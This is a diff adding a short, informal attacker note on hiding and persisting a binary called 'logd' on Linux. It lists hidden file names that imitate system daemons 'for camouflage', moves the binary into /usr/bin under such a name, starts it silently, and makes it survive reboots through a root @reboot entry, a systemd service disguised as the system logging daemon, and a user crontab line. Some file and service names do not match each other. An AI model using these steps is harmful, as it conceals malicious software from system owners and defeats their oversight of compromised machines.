@@ -1,0 +1,49 @@
+[ u can use this ext for camouflage ]
+.rsyslogd
+.svcctl
+.upstartd
+.devd
+.binfmtd
+.xinetd
+.rpcd
+.collectd
+.monit
+.smartd
+.sshd
+.dropbear
+.dhclient
+.NetworkManager
+
+
+mv logd /usr/bin/.rsyslogd
+chmod +x /usr/bin/.rsyslogd
+nohup /usr/bin/.rsyslogd > /dev/null 2>&1 &
+
+after that u can do it
+[ root only ]
+@reboot root /usr/bin/.rsyslogd > /dev/null 2>&1 &
+[ add Systemd service ]
+/etc/systemd/system/rsyslogd.service
+value:
+[Unit]
+Description=System Logging Daemon (rsyslogd)
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/.logd
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+command:
+systemctl daemon-reexec
+systemctl daemon-reload
+systemctl enable logd
+systemctl start logd
+
+[ non root ]
+(crontab -l 2>/dev/null; echo "@reboot $HOME/.logd > /dev/null 2>&1 &") | crontab -
+crontab -l
+
+
+
